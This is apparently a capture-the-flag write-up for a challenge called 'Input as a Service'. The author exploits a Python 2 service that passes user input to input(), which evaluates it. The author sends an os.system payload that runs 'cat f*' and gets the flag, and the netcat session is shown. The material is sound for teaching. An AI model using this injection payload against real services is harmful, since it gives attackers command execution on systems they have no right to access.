# Input as a Service

Challenge text:
```
In order to blend with the extraterrestrials, we need to talk and sound like them. Try some phrases in order to check if you can make them believe you are one of them.
```

I connect to the server using netcat, and it seems to be a Python shell.
```bash
$ nc 138.68.181.43 30730
2.7.18 (default, Apr 20 2020, 19:51:05) 
[GCC 9.2.0]
Do you sound like an alien?
>>> 
```

As a test, I sent `a`, and got the response
```bash
$ nc 138.68.181.43 30730
2.7.18 (default, Apr 20 2020, 19:51:05) 
[GCC 9.2.0]
Do you sound like an alien?
>>> 
a    

 Traceback (most recent call last):
  File "/app/input_as_a_service.py", line 16, in <module>
    main()
  File "/app/input_as_a_service.py", line 12, in main
    text = input(' ')
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```
It looks like the script simply evals anything you send in, so I send `__import__("os").system("cat f*")`, and get the flag.
```bash
$ nc 138.68.181.43 30730
2.7.18 (default, Apr 20 2020, 19:51:05) 
[GCC 9.2.0]
Do you sound like an alien?
>>> 
__import__("os").system("cat f*")
CHTB{4li3n5_us3_pyth0n2.X?!}
```